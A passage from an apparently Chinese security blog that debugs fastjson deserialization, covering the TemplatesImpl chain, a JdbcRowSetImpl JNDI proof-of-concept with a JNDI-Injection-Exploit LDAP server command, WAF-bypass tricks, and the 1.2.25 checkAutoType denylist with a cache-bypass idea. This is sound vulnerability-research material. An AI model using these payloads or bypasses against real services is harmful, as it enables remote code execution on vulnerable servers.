id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>通过调试源码, 可用大致梳理出json字符串解析流程<br>首先我们可以看见几个非常重要的类, 他们分别扮演了以下角色:</p><ul><li>json解析器(<code>json paser</code>)  ,对应 <code>com.alibaba.fastjson.parser.DefaultJSONParser</code>, </li><li>词法分析器(<code>lexer</code>), 主要作用是对各个token进行解析(即字符层面的识别), 通俗的说就是在一长串json字符串中定位出键与值.</li><li>反序列化器(<code>deserilizer</code>), 主要作用是反序列化出各个类, 不同的类对应不同的反序列化器, 由json解析器通过ParserConfig来获取. 对于一个JavaBean, 对应的反序列化器是<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer</code></li></ul><p>json解析器 (<code>DefaultJSONParser</code>)包装了词法分析器(<code>lexer</code>), 而反序列化器与json解析器在解析json字符串时互相依赖 (准确地说, json解析器负责解析出反序列化需要的数据, 反序列化器负责使用这些数据来还原出这个对象,  由于json是一个可以嵌套的结构, 因此这一过程往往是交错进行的)</p><p>可以去看一下DefaultJSONParser的属性如下图</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527220313.png" alt="image.png"></p><p>反序列化器则定义在<code>ParserConfig</code>中<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527220524.png" alt="image.png"></p><p>在本例中, 由于我们传入的基础类是<code>Object.class</code>, 当我们从<code>Object.class</code>开始, json解析器(<code>DefaultJSONParser</code>)拿到<code>Object.class</code>的反序列化器, 开始反序列化. 在此基础上, 开始解析json字符串, 这个工作由<code>DefaultJSONParser</code>发起. 由其包装的词法分析器(<code>lexer</code>)逐字读取并分析, 当词法分析器读到<code>@type</code>时,  发现需要反序列化出来一个类, 获取该类名称为 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>, 此时<code>DefaultJSONParser</code>获取该类的反序列化器(即<code>JavaBeanDeserializer</code>), 由此反序列化器进行反序列化. 初始化该反序列化器时会读取<code>JavaBean</code>的各种信息并保存起来, 包括<code>setter</code>, <code>Field</code>, <code>getter</code>, 很多师傅所说的对<code>getter</code>和<code>setter</code>方法的要求也就是在这一过程产生的.</p><p>拿到<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>的反序列化器后, 之后的过程交由<code>JavaBeanDeserializer</code>进行, 开始反序列化, 首先是使用默认的构造器创建一个<code>TemplatesImpl</code>的实例, 之后为其逐一添加属性, 此时词法分析器会扫描json字符串中<code>TemplatesImpl</code>类的字段(<code>Field</code>), 并进行添加, 此过程中<code>JavaBeanDeserializer</code>会获取并使用字段反序列化器(<code>FieldDeserializer</code>)来对字段的信息进行识别和反序列化(因为字段也可能是任何类型的对象),  <code>FieldDeserializer</code>会尝试调用<code>getter</code>和<code>setter</code>为对应的属性赋值, 本例中恶意字节码加载从此处开始触发, 当读到<code>_outputProperties</code>这个字段时,(这里json中的字符串虽然是<code>_outputProperties</code>, 但是会自动将其识别为<code>outputProperties</code>, 这个过程由smartMatch方法完成), 调用它的getter, 触发恶意类加载.<br>具体的getter和setter调用过程由FieldDeserializer的setValue方法执行,  &#x3D;&#x3D;当该字段有settter时直接调用setter而不调用getter, 无settter时调用getter&#x3D;&#x3D;尝试获取已经生成的对象中对应字段的引用, 并为其赋值</p><p>以上是我对反序列化过程的大致过程的理解, 这些解释是在调试的过程中得出的, 那么就从头来跟一下调试过程吧!</p><p>不必多说, 我们遇到的第一个关键步骤就是这里:<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250530154047.png" alt="image.png"></p><p>&#x3D;&#x3D;来到这一步时, 程序已经完成了:&#x3D;&#x3D;    通过输入的json字符串, 获取对应的json解析器(其中包含lexer), 通过初始类型(<code>Object.class</code>), 获取其反序列化器, 开始反序列化, this指针将当前的json解析器也传给了反序列化器, 因为反序列化的过程是需要解析json的</p><p>跟进 </p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250530154827.png" alt="image.png"></p><p>由于此时我们传入的是Object.class这样一个很宽泛的对象, fastjson首先判断其是否为一个泛型数组, 这是因为如果要反序列化出数组, 那么就可以直接可以将键值对插入到一个Array中, 而若只单单是一个Object.class, 其中不存在任何属性, 无法将得到的属性放进去, 需要后续使用fastjson自己实现的JSONObjcet这个类(一个map)来暂存. Serializable.class也是类似, 并不能实例化后向其中添加属性</p><p>继续跟进, 会走到这里<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250530165435.png" alt="image.png"><br>正如上面的解释, 此时实例了一个JSONObject<br>&#x3D;&#x3D;来到这一步时, 程序已经完成了:&#x3D;&#x3D;    <code>lexer</code>识别到第一个字符<code>&#123;</code>, 实例出JSONObject, 准备解析出json字符串中的数据往里面添加</p><p>继续跟进, 来到这一步<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250530170321.png" alt="image.png"><br>在这里,前面的过程大致就是判断了json格式的正确性, 以及使lexer的指针跳过多余但允许出现的符号(逗号, 注释)<br>&#x3D;&#x3D;来到这一步时, 程序已经完成了:&#x3D;&#x3D;   扫描出第一个key为<code>@type</code></p><p>继续往下看, lexer会扫描出类的名称, 之后json解析器加载这个类, 通过这个类获取对应的反序列化器, 进行反序列化<br>注意获取的反序列化<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250530172742.png" alt="image.png"><br>&#x3D;&#x3D;来到这一步时, 程序已经完成了:&#x3D;&#x3D;   拿到<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>的反序列化器, 这一过程中, 也已经拿到了字段反序列化器,其中包含了getter, setter 如上图.  师傅们可以自行调试查看过程, 为了不打断连贯性, 这个过程有空放在后面补充</p><p>继续跟进到这里<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531005754.png" alt="image.png"><br>这个方法的前面是对上下文信息和json格式的判断, 主要看这里的for循环, 先是对已经拿到的FieldDeserilizer进行遍历, 判断其操作的是否为一些基础类型,  当匹配到时, 标记<code>matchField = true;</code>跳过json字符串的扫描, 直接进入后面对属性赋值的过程,  从而使用特定的反序列化方式进而提升效率<br>这里我们的恶意类有以下三个字段反序列化器, 都不是特殊类型<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531011256.png" alt="image.png"></p><p>这个过程结束后, 就是逐个字段扫描并赋值, 当走到 key为_outputProperties时,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531011753.png" alt="image.png"></p><p>拿到键名, 进行一些特殊键名的判断, 开始解析<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531012122.png" alt="image.png"></p><p>拿到_outputProperties字段的反序列化器, 开始反序列化字段<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531012257.png" alt="image.png"><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531012345.png" alt="image.png"><br>跟进<br>通过&#x3D;&#x3D;FieldValue反序列化器&#x3D;&#x3D;拿到值后, setValue赋值<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531012635.png" alt="image.png"></p><p>跟进<br>触发getter<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531012807.png" alt="image.png"><br>如开篇总结所说_outputProperties是一个readonly属性(只有getter), fastjson会尝试调用它的getter获得内部map的引用来为其赋值</p><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImplPoc</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">PoC</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/ubjazx\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(PoC);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试流程与上面一样, 只不过这里使用的是jndi<br>使用JNDI-Injection-Exploit起一个ldap服务即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot; -A 127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h3><p>在默认的<code>DefaultJSONParser</code>中有以下行为可能可以用来绕过waf<br>默认开启允许任意数量逗号</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527155617.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527155938.png" alt="image.png"><br>skipWhitespace()函数会调用skipComment(); 可以添加注释<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527160630.png" alt="image.png"></p><p>添加注释<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250527160955.png" alt="image.png"></p><h2 id="fastjson-1-2-25-反序列化漏洞-对抗checkAutoType的开始"><a href="#fastjson-1-2-25-反序列化漏洞-对抗checkAutoType的开始" class="headerlink" title="fastjson 1.2.25 反序列化漏洞 对抗checkAutoType的开始"></a>fastjson 1.2.25 反序列化漏洞 对抗checkAutoType的开始</h2><h3 id="利用缓存绕过黑名单"><a href="#利用缓存绕过黑名单" class="headerlink" title="利用缓存绕过黑名单"></a>利用缓存绕过黑名单</h3><p>在此版本中, 上面的exp已经用不了了, 有以下报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.fastjson.JSONException: autoType is not support. com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br><span class="line">at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:844)</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:322)</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327)</span><br><span class="line">at com.alibaba.fastjson.parser.deserializer.JavaObjectDeserializer.deserialze(JavaObjectDeserializer.java:45)</span><br><span class="line">at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:639)</span><br><span class="line">at com.alibaba.fastjson.JSON.parseObject(JSON.java:339)</span><br><span class="line">at com.alibaba.fastjson.JSON.parseObject(JSON.java:302)</span><br><span class="line">at FastjsonWithTemplatesImpl.main(FastjsonWithTemplatesImpl.java:41)</span><br></pre></td></tr></table></figure><p>autoType禁用了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类, 也就是<code>@type</code>不允许此类, 我们在报错位置打断点, 看看是哪里出问题了<br>可以看见断点在了下面这个位置<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531130503.png" alt="image.png"></p><p>这是在ParseConfig中的checkAutoType方法, 上面提到过ParseConfig有一个很重要的作用是用来存放反序列化器, 这里很明显更新后的版本又增加了对需要加载的类的类名的限制, 设置了一个黑名单, 以黑名单中起始的包名都将直接报错<br>具体黑名单如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0 = &quot;bsh&quot;</span><br><span class="line">1 = &quot;com.mchange&quot;</span><br><span class="line">2 = &quot;com.sun.&quot;</span><br><span class="line">3 = &quot;java.lang.Thread&quot;</span><br><span class="line">4 = &quot;java.net.Socket&quot;</span><br><span class="line">5 = &quot;java.rmi&quot;</span><br><span class="line">6 = &quot;javax.xml&quot;</span><br><span class="line">7 = &quot;org.apache.bcel&quot;</span><br><span class="line">8 = &quot;org.apache.commons.beanutils&quot;</span><br><span class="line">9 = &quot;org.apache.commons.collections.Transformer&quot;</span><br><span class="line">10 = &quot;org.apache.commons.collections.functors&quot;</span><br><span class="line">11 = &quot;org.apache.commons.collections4.comparators&quot;</span><br><span class="line">12 = &quot;org.apache.commons.fileupload&quot;</span><br><span class="line">13 = &quot;org.apache.myfaces.context.servlet&quot;</span><br><span class="line">14 = &quot;org.apache.tomcat&quot;</span><br><span class="line">15 = &quot;org.apache.wicket.util&quot;</span><br><span class="line">16 = &quot;org.codehaus.groovy.runtime&quot;</span><br><span class="line">17 = &quot;org.hibernate&quot;</span><br><span class="line">18 = &quot;org.jboss&quot;</span><br><span class="line">19 = &quot;org.mozilla.javascript&quot;</span><br><span class="line">20 = &quot;org.python.core&quot;</span><br><span class="line">21 = &quot;org.springframework&quot;</span><br></pre></td></tr></table></figure><p>我们往回调, 看看是从哪里调用到了checkAutoType<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531131011.png" alt="image.png"><br>如上图, 在json解析器parseObject中进行了调用, 在上个版本中, lexer扫描出类名后会直接loadClass, &#x3D;&#x3D;这个版本则是用ParseConfig.checkAutoType这个方法来加载类&#x3D;&#x3D;, 这个方法会对需要加载的类进行&#x3D;&#x3D;黑名单判断&#x3D;&#x3D;</p><p>这个黑名单涵盖的类算是非常多了, 直接找到一个可用的类比较困难, 我们先来看看checkAutoType是如何工作的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;  </span><br><span class="line">                <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);  </span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;  </span><br><span class="line">        clazz = deserializers.findClass(typeName);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> clazz;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;  </span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;  </span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="keyword">return</span> clazz;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger  </span></span><br><span class="line">                || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver  </span></span><br><span class="line">                ) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;  </span><br><span class="line">                <span class="keyword">return</span> clazz;  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> clazz;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果开启了autoType (<code>autoTypeSupport == true</code>), fastjson会先校验白名单, 需要加载的类若在白名单中, 直接加载, 若不在则校验黑名单. 如果即不在白名单中也不在黑名单中, 则进入以下逻辑<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531141621.png" alt="image.png"></p><p>先从一个mapping中获取, 如何为空, 则从<code>deserializers</code>中获取, 如果也为空, 则进入到后面对于没开启autoType的判断逻辑, 我们暂且不看后面, 这里的mapping和deserializers显然是两个map, 是否可用向其中put进恶意的类呢?<br>先来看TypeUtils.getClassFromMapping的逻辑, 确实是从一个map中get而来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ConcurrentMap&lt;String, Class&lt;?&gt;&gt; mappings = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;String, Class&lt;?&gt;&gt;(<span class="number">16</span>, <span class="number">0.75f</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531142914.png" alt="image.png"></p><p>全局查找mappings.put, 有以下几个地方是可能可控的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531142755.png" alt="image.png"><br>后面三个都存在于TypeUtils.loadClass方法中, 代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (className == <span class="literal">null</span> || className.length() == <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> clazz;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;  </span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);  </span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);  </span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (classLoader != <span class="literal">null</span>) &#123;  </span><br><span class="line">            clazz = classLoader.loadClass(className);  </span><br><span class="line">            mappings.put(className, clazz);  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">return</span> clazz;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;  </span><br><span class="line">        e.printStackTrace();  </span><br><span class="line">        <span class="comment">// skip  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (contextClassLoader != <span class="literal">null</span> &amp;&amp; contextClassLoader != classLoader) &#123;  </span><br><span class="line">            clazz = contextClassLoader.loadClass(className);  </span><br><span class="line">            mappings.put(className, clazz);  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">return</span> clazz;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;  </span><br><span class="line">        <span class="comment">// skip  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        clazz = Class.forName(className);  </span><br><span class="line">        mappings.put(className, clazz);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> clazz;  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;  </span><br><span class="line">        <span class="comment">// skip  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> clazz;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不难发现mappings实际上是对已经加载过的类的缓存. 也就是说, 被加载过的类都会存放在这里, 下次又需要加载的时候, 直接取出来用, 提高效率.<br>&#x3D;&#x3D;如何把我们的恶意类插入到mappings中呢?&#x3D;&#x3D; </p><p>我们返回到之前的调试过程思考: 当json的键为<code>@type</code>时, 它所对应的值(类名)会经过checkAutoType的审查, 但如果此时的恶意类作为一个其他类的Field(同样会被反序列化),或者说它的键名不是<code>@type</code>, 是否会经过checkAutoType呢?<br>全局搜索<code>TypeUtils.loadClass</code>, 